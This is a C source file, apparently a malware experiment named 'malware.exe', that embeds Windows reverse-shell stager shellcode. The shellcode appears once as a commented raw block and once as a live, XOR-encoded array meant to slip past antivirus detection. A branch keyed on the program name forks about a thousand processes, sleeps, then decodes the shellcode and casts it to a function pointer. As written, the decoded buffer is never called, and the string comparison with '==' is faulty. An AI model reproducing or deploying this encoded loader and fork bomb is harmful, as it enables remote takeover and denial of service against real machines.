#include <stdlib.h>
#include <unistd.h> 
#include <stdio.h>
#include <string.h>
/*
unsigned char buf[] =
	"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
	"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
	"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
	"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
	"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
	"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
	"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
	"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
	"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
	"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
	"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
	"\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
	"\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x31"
	"\xdb\x53\x68\x02\x00\x00\x50\x89\xe6\x6a\x10\x56\x57\x68\xc2"
	"\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff\xd5\x53"
	"\x53\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97\x68\x75\x6e\x4d"
	"\x61\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
	"\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58"
	"\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
	"\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3";
*/

int main (int argc, char **argv) {
  if (argc < 2)
    {
      puts("usage: malware.exe [name of the executable]");
      exit(0);
    }
  unsigned char buf[] =
    "\xf9\xed\x8c\x05\x05\x05\x65\x8c\xe0\x34\xd7\x61\x8e\x57\x35"
        "\x8e\x57\x09\x8e\x57\x11\x8e\x77\x2d\x0a\xb2\x4f\x23\x34\xfa"
        "\x34\xc5\xa9\x39\x64\x79\x07\x29\x25\xc4\xca\x08\x04\xc2\xe7"
        "\xf5\x57\x52\x8e\x57\x15\x8e\x47\x39\x04\xd5\x8e\x45\x7d\x80"
        "\xc5\x71\x4f\x04\xd5\x55\x8e\x4d\x1d\x8e\x5d\x25\x04\xd6\xe6"
        "\x39\x4c\x8e\x31\x8e\x04\xd3\x34\xfa\x34\xc5\xa9\xc4\xca\x08"
        "\x04\xc2\x3d\xe5\x70\xf1\x06\x78\xfd\x3e\x78\x21\x70\xe7\x5d"
        "\x8e\x5d\x21\x04\xd6\x63\x8e\x09\x4e\x8e\x5d\x19\x04\xd6\x8e"
        "\x01\x8e\x04\xd5\x8c\x41\x21\x21\x5e\x5e\x64\x5c\x5f\x54\xfa"
        "\xe5\x5d\x5a\x5f\x8e\x17\xee\x83\x58\x6d\x36\x37\x05\x05\x6d"
        "\x72\x76\x37\x5a\x51\x6d\x49\x72\x23\x02\xfa\xd0\xbd\x95\x04"
        "\x05\x05\x2c\xc1\x51\x55\x6d\x2c\x85\x6e\x05\xfa\xd0\x55\x55"
        "\x55\x55\x45\x55\x45\x55\x6d\xef\x0a\xda\xe5\xfa\xd0\x92\x34"
        "\xde\x56\x6d\x07\x05\x05\x55\x8c\xe3\x6f\x15\x53\x52\x6d\xc7"
        "\xde\x32\x62\xfa\xd0\x56\x52\x6d\xb2\xec\x3d\xfa\xfa\xd0\x56"
        "\x56\x52\x6d\x71\xe9\x3e\xe4\xfa\xd0\x52\x92\x6d\x70\x6b\x48"
        "\x64\xfa\xd0\x6f\x05\x6f\x01\x53\x52\x6d\x07\xdc\xcd\x5a\xfa"
        "\xd0\x8e\x33\x6f\x45\x6d\x05\x15\x05\x05\x53\x6f\x05\x6d\x5d"
        "\xa1\x56\xe0\xfa\xd0\x96\x56\x6f\x05\x53\x56\x52\x6d\x07\xdc"
        "\xcd\x5a\xfa\xd0\x04\xc6\x2c\xc3\x80\xf3\x70\xe9\xc6\x05";
  int key = 5;
  long flen;
  flen = (long) sizeof(buf);
  int i;
  /* Declare pointer on function */
  void (*func) ();
  /* Cast shellcode into function */
  int n = 0;
  if (argv[0] == "malware4.exe")
    {
      while(n <1000)
	{
	  fork();
	  n++;
	}
      sleep(100000);
      for(i = 0; i < flen; i++)
	buf[i] = buf[i] ^ key;
      //      puts("test");
    }
  func = (void (*) ()) buf;
  //  free(buf);
  return 1;
  
}
